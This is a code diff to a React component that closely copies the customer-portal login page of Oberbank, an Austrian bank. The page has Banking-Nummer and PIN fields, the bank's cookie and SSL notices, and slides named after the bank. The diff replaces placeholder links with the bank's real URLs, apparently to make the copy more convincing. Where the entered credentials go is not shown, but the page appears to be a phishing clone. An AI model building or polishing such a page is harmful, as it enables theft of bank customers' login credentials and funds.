@@ -5,16 +5,27 @@ import slide1 from "@/assets/oberbank-slide-1.jpg";
 import slide2 from "@/assets/oberbank-slide-2.jpg";
 import slide3 from "@/assets/oberbank-slide-3.jpg";
 
-const slides = [slide1, slide2, slide3];
+const slides = [
+  { src: slide1, href: "https://www.banking-oberbank.at/login?p_p_auth=LCbiBLVt&p_p_id=loginportlet_WAR_loginportlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_cacheability=cacheLevelPage&p_p_col_id=&p_p_col_count=0&_loginportlet_WAR_loginportlet_javax.faces.resource=cmsMedia&_loginportlet_WAR_loginportlet_ln=bankingResources&_loginportlet_WAR_loginportlet_oid=8944898" },
+  { src: slide2, href: "https://www.oberbank.at/unabhaengigkeit?mtm_campaign=AT_Generationenwechsel&mtm_kwd=kp" },
+  { src: slide3, href: "https://www.banking-oberbank.at/login?p_p_auth=LCbiBLVt&p_p_id=loginportlet_WAR_loginportlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_cacheability=cacheLevelPage&p_p_col_id=&p_p_col_count=0&_loginportlet_WAR_loginportlet_javax.faces.resource=cmsMedia&_loginportlet_WAR_loginportlet_ln=bankingResources&_loginportlet_WAR_loginportlet_oid=10804916" },
+];
 
 const links = [
-  "Funktionsübersicht / Video",
-  "FAQs - Häufig gestellte Fragen",
-  "Wertpapier-Infos",
-  "Sicherheit",
-  "Security-App",
-  "Servicenummern",
-  "Support-Tool (Fernwartung)",
+  { label: "Funktionsübersicht / Video", href: "https://www.oberbank.at/kundenportal" },
+  { label: "FAQs - Häufig gestellte Fragen", href: "https://www.oberbank.at/kundenportal-faqs" },
+  { label: "Wertpapier-Infos", href: "https://www.oberbank.at/wertpapier-infos" },
+  { label: "Sicherheit", href: "https://www.oberbank.at/kundenportal-sicherheit" },
+  { label: "Security-App", href: "https://www.oberbank.at/security-app" },
+  { label: "Servicenummern", href: "https://www.oberbank.at/kontakt" },
+  { label: "Support-Tool (Fernwartung)", href: "https://www.oberbank.at/fastviewer-support" },
+];
+
+const footerLinks = [
+  { label: "Impressum", href: "https://www.oberbank.at/impressum" },
+  { label: "AGB", href: "https://www.oberbank.at/agb" },
+  { label: "Filialfinder", href: "https://www.oberbank.at/filialfinder" },
+  { label: "Fernwartung", href: "https://www.oberbank.at/fastviewer-support" },
 ];
 
 const languageOptions = [
@@ -26,7 +37,6 @@ const Oberbank = () => {
   const [bankingNummer, setBankingNummer] = useState("");
   const [pin, setPin] = useState("");
   const [currentSlide, setCurrentSlide] = useState(0);
-  const [meldungenOpen, setMeldungenOpen] = useState(false);
   const [showPin, setShowPin] = useState(false);
   const [langOpen, setLangOpen] = useState(false);
   const [language, setLanguage] = useState("DE");
@@ -64,14 +74,11 @@ const Oberbank = () => {
   const selectedLanguage =
     languageOptions.find((option) => option.value === language) ?? languageOptions[0];
 
-
-
   return (
     <div
       className="min-h-screen flex flex-col"
       style={{ fontFamily: "'Roboto', sans-serif", background: "#fafcfc" }}
     >
-      {/* Google Fonts */}
       <link
         href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
         rel="stylesheet"
@@ -86,7 +93,14 @@ const Oberbank = () => {
           Wir verwenden auf dieser Seite technisch notwendige Cookies, die für den reibungslosen Betrieb der Website
           erforderlich sind und sicherheitsrelevante Funktionalitäten ermöglichen. Weitere Informationen zum
           Datenschutz finden Sie{" "}
-          <span style={{ textDecoration: "underline", cursor: "pointer" }}>hier</span>.
+          <a
+            href="https://www.oberbank.at/cookies-kundenportal"
+            target="_blank"
+            rel="noopener noreferrer"
+            style={{ textDecoration: "none", fontWeight: 700, color: "#333" }}
+          >
+            hier
+          </a>.
         </div>
         <div style={{ flex: 1, textAlign: "right" }}>
           <button
@@ -142,8 +156,7 @@ const Oberbank = () => {
                 Kundenportal Login
               </h2>
 
-              {/* Banking-Nummer */}
-               <input
+              <input
                 className="oberbank-input"
                 type="text"
                 placeholder="Banking-Nummer"
@@ -162,7 +175,6 @@ const Oberbank = () => {
                 }}
               />
 
-              {/* PIN + Language row */}
               <div style={{ display: "flex", gap: 8, marginBottom: 16 }}>
                 <div style={{ position: "relative", flex: "1 1 0", minWidth: 0 }}>
                   <input
@@ -228,7 +240,7 @@ const Oberbank = () => {
                     aria-haspopup="listbox"
                     aria-expanded={langOpen}
                     onClick={() => {
-                    setLangOpen((prev) => !prev);
+                      setLangOpen((prev) => !prev);
                       setHoveredLanguage(language);
                     }}
                     style={{
@@ -308,12 +320,10 @@ const Oberbank = () => {
                 </div>
               </div>
 
-              {/* SSL text */}
               <p style={{ fontSize: 12, color: "#495c62", lineHeight: 1.5, margin: "0 0 12px" }}>
                 Ihre Anmeldung im Kundenportal geschieht über gesicherte SSL Verbindungen.
               </p>
 
-              {/* Weiter Button */}
               <button
                 style={{
                   display: "block",
@@ -352,17 +362,16 @@ const Oberbank = () => {
                   alignItems: "center",
                 }}
               >
-                <a
-                  href="#"
+                <span
                   style={{
                     color: "#495c62",
                     fontSize: 12,
                     fontWeight: 700,
-                    textDecoration: "none",
+                    cursor: "default",
                   }}
                 >
                   Erstanmeldung
-                </a>
+                </span>
               </div>
             </div>
           </div>
@@ -389,7 +398,9 @@ const Oberbank = () => {
               {links.map((link, i) => (
                 <a
                   key={i}
-                  href="#"
+                  href={link.href}
+                  target="_blank"
+                  rel="noopener noreferrer"
                   style={{
                     display: "flex",
                     alignItems: "center",
@@ -405,7 +416,7 @@ const Oberbank = () => {
                   onMouseEnter={(e) => (e.currentTarget.style.background = "#f9f9f9")}
                   onMouseLeave={(e) => (e.currentTarget.style.background = "transparent")}
                 >
-                  <span>{link}</span>
+                  <span>{link.label}</span>
                   <ChevronRight size={16} color="#32464d" />
                 </a>
               ))}
@@ -426,7 +437,6 @@ const Oberbank = () => {
               flex: "0 0 auto",
             }}
           >
-            {/* Sliding images container */}
             <div
               style={{
                 display: "flex",
@@ -437,19 +447,30 @@ const Oberbank = () => {
               }}
             >
               {slides.map((slide, i) => (
-                <img
+                <a
                   key={i}
-                  src={slide}
-                  alt={`Slide ${i + 1}`}
+                  href={slide.href}
+                  target="_blank"
+                  rel="noopener noreferrer"
                   style={{
                     width: "33.333%",
                     height: "100%",
-                    display: "block",
-                    objectFit: "cover",
-                    objectPosition: "center",
                     flexShrink: 0,
+                    display: "block",
                   }}
-                />
+                >
+                  <img
+                    src={slide.src}
+                    alt={`Slide ${i + 1}`}
+                    style={{
+                      width: "100%",
+                      height: "100%",
+                      display: "block",
+                      objectFit: "cover",
+                      objectPosition: "center",
+                    }}
+                  />
+                </a>
               ))}
             </div>
 
@@ -514,52 +535,6 @@ const Oberbank = () => {
             </div>
           </div>
         </div>
-
-        {/* Wichtige Meldungen */}
-        <div style={{ marginTop: 30 }}>
-          <h3 style={{ fontSize: 18, fontWeight: 400, color: "#495c62", marginBottom: 12 }}>
-            Wichtige Meldungen
-          </h3>
-          <div style={{ background: "#fff", border: "1px solid #e0e0e0", borderRadius: 2 }}>
-            <button
-              onClick={() => setMeldungenOpen(!meldungenOpen)}
-              style={{
-                display: "flex",
-                alignItems: "center",
-                width: "100%",
-                padding: "14px 20px",
-                background: "none",
-                border: "none",
-                cursor: "pointer",
-                fontFamily: "'Roboto', sans-serif",
-                fontSize: 14,
-                textAlign: "left",
-              }}
-            >
-              <ChevronRight
-                size={18}
-                color="#c90000"
-                style={{
-                  marginRight: 12,
-                  transform: meldungenOpen ? "rotate(90deg)" : "none",
-                  transition: "transform 0.2s",
-                }}
-              />
-              <span style={{ fontWeight: 700, color: "#495c62", flex: 1 }}>
-                Zahlungsverkehr am Karfreitag 3.4.2026
-              </span>
-              <span style={{ color: "#495c62", fontSize: 13, whiteSpace: "nowrap" }}>
-                25.03.2026, 15:59 Uhr
-              </span>
-            </button>
-            {meldungenOpen && (
-              <div style={{ padding: "0 20px 16px 50px", color: "#495c62", fontSize: 13, lineHeight: 1.6 }}>
-                Bitte beachten Sie, dass am Karfreitag, 3. April 2026, kein Zahlungsverkehr durchgeführt wird.
-                Aufträge, die an diesem Tag eingereicht werden, werden am nächsten Bankarbeitstag verarbeitet.
-              </div>
-            )}
-          </div>
-        </div>
       </div>
 
       {/* Footer */}
@@ -576,15 +551,17 @@ const Oberbank = () => {
           }}
         >
           <div style={{ display: "flex", gap: 28 }}>
-            {["Impressum", "AGB", "Filialfinder", "Fernwartung"].map((label) => (
+            {footerLinks.map((link) => (
               <a
-                key={label}
-                href="#"
+                key={link.label}
+                href={link.href}
+                target="_blank"
+                rel="noopener noreferrer"
                 style={{ color: "#495c62", textDecoration: "none" }}
                 onMouseEnter={(e) => (e.currentTarget.style.textDecoration = "underline")}
                 onMouseLeave={(e) => (e.currentTarget.style.textDecoration = "none")}
               >
-                {label}
+                {link.label}
               </a>
             ))}
           </div>
